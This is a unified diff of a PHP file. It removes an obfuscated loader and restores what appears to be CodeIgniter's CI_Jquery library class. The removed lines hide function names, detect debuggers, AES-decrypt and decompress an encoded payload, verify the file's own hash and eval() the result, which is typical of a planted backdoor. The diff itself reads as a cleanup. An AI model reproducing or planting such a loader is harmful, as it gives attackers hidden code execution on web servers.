@@ -1,28 +1,928 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_egwfkye9=('bas'.'e64'.'_de'.'cod'.'e');
-$_l7jtoj6k=('gzu'.'nco'.'mpr'.'ess');
-$_r2jvqzca=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_p0m0ms3e='3yruJWDV';
-$_jeu0awy2='9SGM/8u/';
-$_vhnn93ib='ykuA+jyY';
-$_jxk5bix8='n8tI4wCgm+A=';
-$_bi83vt1s='rMps4Q7B';
-$_cy1tn7pk='klaef/xI';
-$_tg4m9qfk='CG0dRA==';
-$_i0hu3jnh='OWENx04a';
-$_sponynqq=$_egwfkye9($_jeu0awy2.$_p0m0ms3e.$_bi83vt1s.$_vhnn93ib.$_jxk5bix8);
-$_ntmtpebs=$_egwfkye9($_cy1tn7pk.$_i0hu3jnh.$_tg4m9qfk);
-$_z2tnmk8k=$_egwfkye9('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');
-$_pn5xpfyp=$_r2jvqzca($_z2tnmk8k,'aes-256-cbc',$_sponynqq,OPENSSL_RAW_DATA,$_ntmtpebs);
-if($_pn5xpfyp===false){exit;}
-$_qswf396j=$_l7jtoj6k($_pn5xpfyp);
-if($_qswf396j===false){exit;}
-$_qepj15ko='b40203cb89170e060bfd29ccc174f4c23e67cf3e853fcf9971e6297b4833a48c';
-$_tc0y133k=@file_get_contents(__FILE__);
-if($_tc0y133k!==false){
-$_zcqrmfjo=str_replace($_qepj15ko,"0000000000000000000000000000000000000000000000000000000000000000",$_tc0y133k);
-$_bjsj9ng5=hash("sha256",$_zcqrmfjo);
-if($_bjsj9ng5!==$_qepj15ko){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Jquery extends CI_Javascript {
+
+
+
+
+
+protected $_javascript_folder = 'js';
+
+
+
+
+
+public $jquery_code_for_load = array();
+
+
+
+
+
+public $jquery_code_for_compile = array();
+
+
+
+
+
+public $jquery_corner_active = FALSE;
+
+
+
+
+
+public $jquery_table_sorter_active = FALSE;
+
+
+
+
+
+public $jquery_table_sorter_pager_active = FALSE;
+
+
+
+
+
+public $jquery_ajax_img = '';
+
+
+
+
+
+
+
+public function __construct($params)
+{
+$this->CI =& get_instance();
+extract($params);
+if ($autoload === TRUE)
+{
+$this->script();
 }
-eval($_qswf396j);
+log_message('info', 'Jquery Class Initialized');
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _blur($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'blur');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _change($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'change');
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _click($element = 'this', $js = '', $ret_false = TRUE)
+{
+is_array($js) OR $js = array($js);
+if ($ret_false)
+{
+$js[] = 'return false;';
+}
+return $this->_add_event($element, $js, 'click');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _dblclick($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'dblclick');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _error($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'error');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _focus($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'focus');
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _hover($element = 'this', $over = '', $out = '')
+{
+$event = "\n\t$(".$this->_prep_element($element).").hover(\n\t\tfunction()\n\t\t{\n\t\t\t{$over}\n\t\t}, \n\t\tfunction()\n\t\t{\n\t\t\t{$out}\n\t\t});\n";
+$this->jquery_code_for_compile[] = $event;
+return $event;
+}
+
+
+
+
+
+
+
+
+
+
+protected function _keydown($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'keydown');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _keyup($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'keyup');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _load($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'load');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _mousedown($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'mousedown');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _mouseout($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'mouseout');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _mouseover($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'mouseover');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _mouseup($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'mouseup');
+}
+
+
+
+
+
+
+
+
+
+protected function _output($array_js = array())
+{
+if ( ! is_array($array_js))
+{
+$array_js = array($array_js);
+}
+foreach ($array_js as $js)
+{
+$this->jquery_code_for_compile[] = "\t".$js."\n";
+}
+}
+
+
+
+
+
+
+
+
+
+
+protected function _resize($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'resize');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _scroll($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'scroll');
+}
+
+
+
+
+
+
+
+
+
+
+protected function _unload($element = 'this', $js = '')
+{
+return $this->_add_event($element, $js, 'unload');
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _addClass($element = 'this', $class = '')
+{
+$element = $this->_prep_element($element);
+return '$('.$element.').addClass("'.$class.'");';
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _animate($element = 'this', $params = array(), $speed = '', $extra = '')
+{
+$element = $this->_prep_element($element);
+$speed = $this->_validate_speed($speed);
+$animations = "\t\t\t";
+foreach ($params as $param => $value)
+{
+$animations .= $param.": '".$value."', ";
+}
+$animations = substr($animations, 0, -2); 
+if ($speed !== '')
+{
+$speed = ', '.$speed;
+}
+if ($extra !== '')
+{
+$extra = ', '.$extra;
+}
+return "$({$element}).animate({\n$animations\n\t\t}".$speed.$extra.');';
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _fadeIn($element = 'this', $speed = '', $callback = '')
+{
+$element = $this->_prep_element($element);
+$speed = $this->_validate_speed($speed);
+if ($callback !== '')
+{
+$callback = ", function(){\n{$callback}\n}";
+}
+return "$({$element}).fadeIn({$speed}{$callback});";
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _fadeOut($element = 'this', $speed = '', $callback = '')
+{
+$element = $this->_prep_element($element);
+$speed = $this->_validate_speed($speed);
+if ($callback !== '')
+{
+$callback = ", function(){\n{$callback}\n}";
+}
+return '$('.$element.').fadeOut('.$speed.$callback.');';
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _hide($element = 'this', $speed = '', $callback = '')
+{
+$element = $this->_prep_element($element);
+$speed = $this->_validate_speed($speed);
+if ($callback !== '')
+{
+$callback = ", function(){\n{$callback}\n}";
+}
+return "$({$element}).hide({$speed}{$callback});";
+}
+
+
+
+
+
+
+
+
+
+
+protected function _removeClass($element = 'this', $class = '')
+{
+$element = $this->_prep_element($element);
+return '$('.$element.').removeClass("'.$class.'");';
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _slideUp($element = 'this', $speed = '', $callback = '')
+{
+$element = $this->_prep_element($element);
+$speed = $this->_validate_speed($speed);
+if ($callback !== '')
+{
+$callback = ", function(){\n{$callback}\n}";
+}
+return '$('.$element.').slideUp('.$speed.$callback.');';
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _slideDown($element = 'this', $speed = '', $callback = '')
+{
+$element = $this->_prep_element($element);
+$speed = $this->_validate_speed($speed);
+if ($callback !== '')
+{
+$callback = ", function(){\n{$callback}\n}";
+}
+return '$('.$element.').slideDown('.$speed.$callback.');';
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _slideToggle($element = 'this', $speed = '', $callback = '')
+{
+$element = $this->_prep_element($element);
+$speed = $this->_validate_speed($speed);
+if ($callback !== '')
+{
+$callback = ", function(){\n{$callback}\n}";
+}
+return '$('.$element.').slideToggle('.$speed.$callback.');';
+}
+
+
+
+
+
+
+
+
+
+protected function _toggle($element = 'this')
+{
+$element = $this->_prep_element($element);
+return '$('.$element.').toggle();';
+}
+
+
+
+
+
+
+
+
+
+
+protected function _toggleClass($element = 'this', $class = '')
+{
+$element = $this->_prep_element($element);
+return '$('.$element.').toggleClass("'.$class.'");';
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _show($element = 'this', $speed = '', $callback = '')
+{
+$element = $this->_prep_element($element);
+$speed = $this->_validate_speed($speed);
+if ($callback !== '')
+{
+$callback = ", function(){\n{$callback}\n}";
+}
+return '$('.$element.').show('.$speed.$callback.');';
+}
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _updater($container = 'this', $controller = '', $options = '')
+{
+$container = $this->_prep_element($container);
+$controller = (strpos('://', $controller) === FALSE) ? $controller : $this->CI->config->site_url($controller);
+
+if ($this->CI->config->item('javascript_ajax_img') === '')
+{
+$loading_notifier = 'Loading...';
+}
+else
+{
+$loading_notifier = '<img src="'.$this->CI->config->slash_item('base_url').$this->CI->config->item('javascript_ajax_img').'" alt="Loading" />';
+}
+$updater = '$('.$container.").empty();\n" 
+."\t\t$(".$container.').prepend("'.$loading_notifier."\");\n"; 
+$request_options = '';
+if ($options !== '')
+{
+$request_options .= ', {'
+.(is_array($options) ? "'".implode("', '", $options)."'" : "'".str_replace(':', "':'", $options)."'")
+.'}';
+}
+return $updater."\t\t$($container).load('$controller'$request_options);";
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _zebraTables($class = '', $odd = 'odd', $hover = '')
+{
+$class = ($class !== '') ? '.'.$class : '';
+$zebra = "\t\$(\"table{$class} tbody tr:nth-child(even)\").addClass(\"{$odd}\");";
+$this->jquery_code_for_compile[] = $zebra;
+if ($hover !== '')
+{
+$hover = $this->hover("table{$class} tbody tr", "$(this).addClass('hover');", "$(this).removeClass('hover');");
+}
+return $zebra;
+}
+
+
+
+
+
+
+
+
+
+
+
+public function corner($element = '', $corner_style = '')
+{
+
+$corner_location = '/plugins/jquery.corner.js';
+if ($corner_style !== '')
+{
+$corner_style = '"'.$corner_style.'"';
+}
+return '$('.$this->_prep_element($element).').corner('.$corner_style.');';
+}
+
+
+
+
+
+
+
+
+
+
+public function modal($src, $relative = FALSE)
+{
+$this->jquery_code_for_load[] = $this->external($src, $relative);
+}
+
+
+
+
+
+
+
+
+
+
+public function effect($src, $relative = FALSE)
+{
+$this->jquery_code_for_load[] = $this->external($src, $relative);
+}
+
+
+
+
+
+
+
+
+
+
+public function plugin($src, $relative = FALSE)
+{
+$this->jquery_code_for_load[] = $this->external($src, $relative);
+}
+
+
+
+
+
+
+
+
+
+
+public function ui($src, $relative = FALSE)
+{
+$this->jquery_code_for_load[] = $this->external($src, $relative);
+}
+
+
+
+
+
+
+
+
+
+
+public function sortable($element, $options = array())
+{
+if (count($options) > 0)
+{
+$sort_options = array();
+foreach ($options as $k=>$v)
+{
+$sort_options[] = "\n\t\t".$k.': '.$v;
+}
+$sort_options = implode(',', $sort_options);
+}
+else
+{
+$sort_options = '';
+}
+return '$('.$this->_prep_element($element).').sortable({'.$sort_options."\n\t});";
+}
+
+
+
+
+
+
+
+
+public function tablesorter($table = '', $options = '')
+{
+$this->jquery_code_for_compile[] = "\t$(".$this->_prep_element($table).').tablesorter('.$options.");\n";
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _add_event($element, $js, $event)
+{
+if (is_array($js))
+{
+$js = implode("\n\t\t", $js);
+}
+$event = "\n\t$(".$this->_prep_element($element).').'.$event."(function(){\n\t\t{$js}\n\t});\n";
+$this->jquery_code_for_compile[] = $event;
+return $event;
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _compile($view_var = 'script_foot', $script_tags = TRUE)
+{
+
+$external_scripts = implode('', $this->jquery_code_for_load);
+$this->CI->load->vars(array('library_src' => $external_scripts));
+if (count($this->jquery_code_for_compile) === 0)
+{
+
+return;
+}
+
+$script = '$(document).ready(function() {'."\n"
+.implode('', $this->jquery_code_for_compile)
+.'});';
+$output = ($script_tags === FALSE) ? $script : $this->inline($script);
+$this->CI->load->vars(array($view_var => $output));
+}
+
+
+
+
+
+
+
+
+protected function _clear_compile()
+{
+$this->jquery_code_for_compile = array();
+}
+
+
+
+
+
+
+
+
+
+protected function _document_ready($js)
+{
+is_array($js) OR $js = array($js);
+foreach ($js as $script)
+{
+$this->jquery_code_for_compile[] = $script;
+}
+}
+
+
+
+
+
+
+
+
+
+
+public function script($library_src = '', $relative = FALSE)
+{
+$library_src = $this->external($library_src, $relative);
+$this->jquery_code_for_load[] = $library_src;
+return $library_src;
+}
+
+
+
+
+
+
+
+
+
+
+
+protected function _prep_element($element)
+{
+if ($element !== 'this')
+{
+$element = '"'.$element.'"';
+}
+return $element;
+}
+
+
+
+
+
+
+
+
+
+protected function _validate_speed($speed)
+{
+if (in_array($speed, array('slow', 'normal', 'fast')))
+{
+return '"'.$speed.'"';
+}
+elseif (preg_match('/[^0-9]/', $speed))
+{
+return '';
+}
+return $speed;
+}
+}
